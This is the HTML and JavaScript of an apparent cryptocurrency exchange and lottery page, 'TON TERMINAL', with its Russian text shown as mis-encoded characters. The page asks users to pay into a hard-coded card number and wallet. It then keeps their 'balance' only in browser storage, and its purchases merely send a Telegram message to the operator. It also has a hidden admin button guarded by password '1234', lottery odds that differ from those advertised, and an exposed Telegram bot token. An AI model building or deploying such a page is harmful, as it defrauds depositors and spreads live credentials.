<!DOCTYPE html>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background-color: #05080f; color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255,255,255,0.05); }
        .input-box { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255,255,255,0.1); }
        .buy-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); transition: all 0.3s; }
        .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3); }
        .nav-tab.active { background: rgba(59, 130, 246, 0.2); border: 1px solid #3b82f6; color: #3b82f6; }
        #snow-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
        .falling-item { position: absolute; top: -50px; animation: fall linear infinite; }
        @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 0; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0; } }
        .garland { position: fixed; top: 0; left: 0; width: 100%; z-index: 100; display: flex; justify-content: space-around; pointer-events: none; }
        .bulb { width: 12px; height: 12px; border-radius: 50%; animation: blink 1s infinite alternate; margin-top: 5px; }
        @keyframes blink { from { opacity: 0.2; } to { opacity: 1; box-shadow: 0 0 15px currentColor; } }
    </style>
</head>
<body class="min-h-screen pb-20">

    <div class="garland">

        <div class="bulb" style="color: #0000ff; background: #0000ff; animation-delay: 0.4s"></div>
        <div class="bulb" style="color: #ffff00; background: #ffff00; animation-delay: 0.6s"></div>
    </div>

    <div id="snow-bg"></div>

    <nav class="border-b border-white/5 py-4 px-4 md:px-8 flex justify-between items-center glass sticky top-0 z-50">
        <div class="flex items-center gap-2">
            <span class="text-lg font-extrabold italic">TON<span class="text-blue-500">TERMINAL</span></span>
        </div>
        <div class="flex items-center gap-3">
            <div class="text-right glass px-4 py-1.5 rounded-xl border border-white/10">

                <p id="balance-display" class="text-sm font-black text-green-400">0.00 –≥—Ä–Ω</p>
            </div>
            <button onclick="openModal('deposit-modal')" class="bg-blue-600 hover:bg-blue-500 p-2 rounded-lg transition-all">‚ûï</button>

    </nav>

    <main class="max-w-7xl mx-auto p-4 md:p-8 relative z-10">
        <div class="flex justify-center flex-wrap gap-2 mb-8">
            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">üìà –ö—É—Ä—Å</button>
            <button onclick="showTab('convert')" id="btn-convert" class="nav-tab glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">üîÑ –ö–æ–Ω–≤–µ—Ä—Ç–µ—Ä</button>
            <button onclick="showTab('shop')" id="btn-shop" class="nav-tab glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">üõí –ú–∞–≥–∞–∑</button>
            <button onclick="showTab('lotto')" id="btn-lotto" class="nav-tab glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">üéÅ –õ–æ—Ç–æ</button>
        </div>

        <div id="view-main" class="block">
            <div class="glass p-6 rounded-[2.5rem] min-h-[500px]">
                <div id="tradingview_widget" class="h-[450px] w-full rounded-2xl overflow-hidden"></div>
            </div>
        </div>

        <div id="view-convert" class="hidden">
            <div class="max-w-3xl mx-auto glass p-8 rounded-[3rem]">
                <h3 class="text-2xl font-black uppercase mb-8 text-center">–ì–ª–æ–±–∞–ª—å–Ω—ã–π <span class="text-blue-500">–ö–æ–Ω–≤–µ—Ä—Ç–µ—Ä</span></h3>
                <div class="input-box p-6 rounded-2xl mb-8">
                    <label class="text-[10px] text-slate-500 uppercase font-black block mb-2">–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤ USD ($)</label>
                    <input type="number" id="conv-usd" value="500" class="bg-transparent text-4xl font-bold outline-none w-full text-blue-400" oninput="runGlobalConvert()">
                </div>
                <div id="conv-results" class="grid grid-cols-2 md:grid-cols-3 gap-4"></div>
            </div>
        </div>

        <div id="view-shop" class="hidden">
            <div class="max-w-2xl mx-auto glass p-8 rounded-[3rem]">
                <h3 class="text-2xl font-black uppercase mb-8 text-center italic">–ö—É–ø–∏—Ç—å <span class="text-blue-500">–ö—Ä–∏–ø—Ç—É</span></h3>
                <div class="space-y-4">
                    <select id="shop-coin-select" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl text-sm font-bold outline-none text-white" onchange="updateShopRate()">
                        <option value="TON">TON (Toncoin)</option>
                        <option value="BTC">BTC (Bitcoin)</option>
                        <option value="ETH">ETH (Ethereum)</option>
                        <option value="SOL">SOL (Solana)</option>
                        <option value="DOGE">DOGE (Dogecoin)</option>
                        <option value="XRP">XRP (Ripple)</option>
                        <option value="TRX">TRX (TRON)</option>
                        <option value="LTC">LTC (Litecoin)</option>
                        <option value="ADA">ADA (Cardano)</option>
                        <option value="AVAX">AVAX (Avalanche)</option>
                        <option value="DOT">DOT (Polkadot)</option>
                        <option value="MATIC">MATIC (Polygon)</option>
                        <option value="NEAR">NEAR (Near Protocol)</option>
                        <option value="LINK">LINK (Chainlink)</option>
                    </select>
                    <div class="input-box p-5 rounded-2xl">
                        <label class="text-[9px] text-slate-500 uppercase font-black block">–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–æ–Ω–µ—Ç</label>
                        <input type="number" id="shop-qty" value="1" class="bg-transparent text-2xl font-bold outline-none w-full text-white" oninput="updateShopRate()">
                    </div>
                    <div class="input-box p-5 rounded-2xl">
                        <label class="text-[9px] text-blue-500 uppercase font-black block">–¢–≤–æ–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞</label>
                        <input type="text" id="shop-wallet" placeholder="–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è..." class="bg-transparent text-xs font-mono outline-none w-full text-blue-300">
                    </div>
                    <div class="text-center p-4 bg-white/5 rounded-xl">
                        <div id="shop-total" class="text-3xl font-black text-green-400">0.00 –≥—Ä–Ω</div>
                        <p class="text-[8px] text-slate-500 uppercase mt-1 italic">–ö–æ–º–∏—Å—Å–∏—è 7.5%</p>
                    </div>
                    <button onclick="processFinalPurchase()" class="buy-btn w-full py-5 rounded-2xl font-black text-xs uppercase shadow-2xl text-white">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞—è–≤–∫—É üöÄ</button>
                </div>
            </div>
        </div>

        <div id="view-lotto" class="hidden text-center">
            <div class="glass p-12 rounded-[4rem] max-w-2xl mx-auto">
                <h2 class="text-5xl font-black mb-4 uppercase italic">Lotto <span class="text-blue-500">2026</span></h2>
                <div id="box-anim" class="text-9xl my-10 cursor-pointer">üéÅ</div>
                <button onclick="playLotto()" id="lotto-btn" class="buy-btn px-12 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl text-white">–ò–≥—Ä–∞—Ç—å –∑–∞ 350 –≥—Ä–Ω</button>
                <p class="mt-4 text-[10px] text-yellow-500 font-black uppercase tracking-widest">–®–∞–Ω—Å: 0.1%</p>
            </div>
        </div>
    </main>

    <div id="deposit-modal" class="fixed inset-0 bg-black/95 z-[200] hidden items-center justify-center p-4">
        <div class="glass p-8 rounded-[3rem] max-w-sm w-full text-center">
            <h3 class="text-xl font-black uppercase mb-6 text-blue-500">–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</h3>
            <input type="number" id="dep-input" value="100" class="input-box p-4 rounded-xl w-full text-xl font-bold mb-4 outline-none text-white">
            <div class="flex gap-2 mb-6 text-white">
                <button onclick="showDetails('Card')" class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all">–ö–∞—Ä—Ç–∞</button>
                <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all">–ö–æ—à–µ–ª–µ–∫</button>
            </div>
            <div id="pay-details" class="hidden bg-blue-500/10 p-4 rounded-2xl mb-6 text-left">
                <p id="details-val" class="text-[10px] font-mono break-all bg-black/40 p-2 rounded select-all text-white"></p>
            </div>
            <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-[10px] uppercase text-white">–Ø –æ–ø–ª–∞—Ç–∏–ª</button>
            <button onclick="closeModal('deposit-modal')" class="w-full mt-4 text-slate-600 text-[10px] font-black uppercase">–ù–∞–∑–∞–¥</button>
        </div>
    </div>

    <button onclick="adminAction()" class="fixed bottom-4 right-4 w-8 h-8 opacity-5 hover:opacity-100 transition-opacity z-[500] bg-white rounded-full text-black font-bold">A</button>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const TG_TOKEN = "8357376946:AAHbffgk6JY0Ip3yJ3yOGpTaG-_HZ7gjJZw";
        const TG_CHAT_ID = "5252821529";
        const MY_CARD = "444 1144 3897 8734";
        const MY_TON_WALLET = "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz";
        
        let balance = parseFloat(localStorage.getItem('user_balance')) || 0;
        let rates = {};

        async function fetchAllRates() {
            try {
                const res = await fetch('https://api.binance.com/api/v3/ticker/price');
                const data = await res.json();
                const symbols = ['TONUSDT', 'BTCUSDT', 'ETHUSDT', 'SOLUSDT', 'DOGEUSDT', 'XRPUSDT', 'TRXUSDT', 'LTCUSDT', 'ADAUSDT', 'AVAXUSDT', 'DOTUSDT', 'MATICUSDT', 'NEARUSDT', 'LINKUSDT'];
                data.forEach(item => {
                    if(symbols.includes(item.symbol)) {
                        rates[item.symbol.replace('USDT', '')] = parseFloat(item.price);
                    }
                });
                runGlobalConvert();
                updateShopRate();
            } catch(e) {}
        }

        function runGlobalConvert() {
            const usd = parseFloat(document.getElementById('conv-usd').value) || 0;
            const container = document.getElementById('conv-results');
            if(!container) return;
            container.innerHTML = "";
            Object.keys(rates).forEach(coin => {
                const amount = usd / rates[coin];
                container.innerHTML += `
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
                        <p class="text-[8px] uppercase text-slate-500 font-bold mb-1">${coin}</p>
                        <p class="text-sm font-black text-blue-400">${amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</p>
                    </div>`;
            });
        }

        function updateShopRate() {
            const coin = document.getElementById('shop-coin-select').value;
            const qty = parseFloat(document.getElementById('shop-qty').value) || 0;
            if(!rates[coin]) return;
            const uahPrice = rates[coin] * 42.5 * 1.075;
            document.getElementById('shop-total').innerText = (qty * uahPrice).toFixed(2) + " –≥—Ä–Ω";
        }

        function updateUI() {
            document.getElementById('balance-display').innerText = balance.toFixed(2) + " –≥—Ä–Ω";
            localStorage.setItem('user_balance', balance);
        }

        async function sendToAdmin(msg) {
            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`;
            await fetch(url);
        }

        function showDetails(method) {
            document.getElementById('pay-details').classList.remove('hidden');
            document.getElementById('details-val').innerText = method === 'Card' ? MY_CARD : MY_TON_WALLET;
        }

        function confirmDeposit() {
            const amt = document.getElementById('dep-input').value;
            sendToAdmin(`üí∞ –ù–û–í–´–ô –î–ï–ü–û–ó–ò–¢!\n–°—É–º–º–∞: ${amt} –≥—Ä–Ω\n–ü—Ä–æ–≤–µ—Ä—å –∫–∞—Ä—Ç—É/–∫–æ—à–µ–ª–µ–∫ –∏ –∑–∞—á–∏—Å–ª–∏ —á–µ—Ä–µ–∑ –∞–¥–º–∏–Ω–∫—É!`);
            closeModal('deposit-modal');
            alert("–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.");
        }

        function adminAction() {
            const pass = prompt("–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∞:");
            if (pass === "1234") {
                const add = parseFloat(prompt("–°–∫–æ–ª—å–∫–æ –≥—Ä–Ω –∑–∞—á–∏—Å–ª–∏—Ç—å –Ω–∞ –±–∞–ª–∞–Ω—Å?"));
                if (!isNaN(add)) { balance += add; updateUI(); }
            }
        }

        function processFinalPurchase() {
            const coin = document.getElementById('shop-coin-select').value;
            const qty = document.getElementById('shop-qty').value;
            const wallet = document.getElementById('shop-wallet').value;
            const uahPrice = rates[coin] * 42.5 * 1.075 * qty;

            if (balance < uahPrice) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –≥—Ä–Ω!");
            if (wallet.length < 5) return alert("–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å!");

            balance -= uahPrice;
            updateUI();
            sendToAdmin(`üõí –ö–£–ü–ò–õ–ò –ö–†–ò–ü–¢–£!\n–ú–æ–Ω–µ—Ç–∞: ${coin}\n–ö–æ–ª-–≤–æ: ${qty}\n–ê–¥—Ä–µ—Å: ${wallet}\n–°–ø–∏—Å–∞–Ω–æ: ${uahPrice.toFixed(2)} –≥—Ä–Ω`);
            alert("–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞! –û—Ç–ø—Ä–∞–≤–∏–º –∫—Ä–∏–ø—Ç—É –≤ —Ç–µ—á–µ–Ω–∏–µ 15 –º–∏–Ω—É—Ç.");
        }

        function playLotto() {
            if (balance < 350) return alert("–ù—É–∂–Ω–æ 350 –≥—Ä–Ω!");
            balance -= 350; updateUI();
            const box = document.getElementById('box-anim');
            box.classList.add('shake');
            setTimeout(() => {
                box.classList.remove('shake');
                const r = Math.random() * 100;
                let win = (r <= 0.000001) ? 25000 : (r <= 5.0 ? 2500 : 275);
                balance += win; updateUI();
                alert(`–í—ã–∏–≥—Ä—ã—à: ${win} –≥—Ä–Ω! –ó–∞—á–∏—Å–ª–µ–Ω–æ.`);
                sendToAdmin(`üéâ –í–´–ò–ì–†–´–®!\n–°—É–º–º–∞: ${win} –≥—Ä–Ω\n–ë–∞–ª–∞–Ω—Å —é–∑–µ—Ä–∞: ${balance.toFixed(2)} –≥—Ä–Ω`);
            }, 2000);
        }

        function showTab(tab) {
            ['main', 'convert', 'shop', 'lotto'].forEach(t => {
                document.getElementById('view-' + t).classList.toggle('hidden', t !== tab);
                document.getElementById('btn-' + t).classList.toggle('active', t === tab);
            });
        }

        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }

        setInterval(fetchAllRates, 20000);
        fetchAllRates();
        updateUI();
        
        setInterval(() => {
            const el = document.createElement('div'); el.className = 'falling-item'; el.innerHTML = '‚ùÑ';
            el.style.left = Math.random() * 100 + 'vw';
            const dur = Math.random() * 5 + 5; el.style.animationDuration = dur + 's';
            document.getElementById('snow-bg').appendChild(el); setTimeout(() => el.remove(), dur * 1000);
        }, 400);

        new TradingView.widget({ "autosize": true, "symbol": "OKX:TONUSDT", "interval": "H", "theme": "dark", "container_id": "tradingview_widget", "backgroundColor": "#05080f" });
    </script>
</body>
</html>
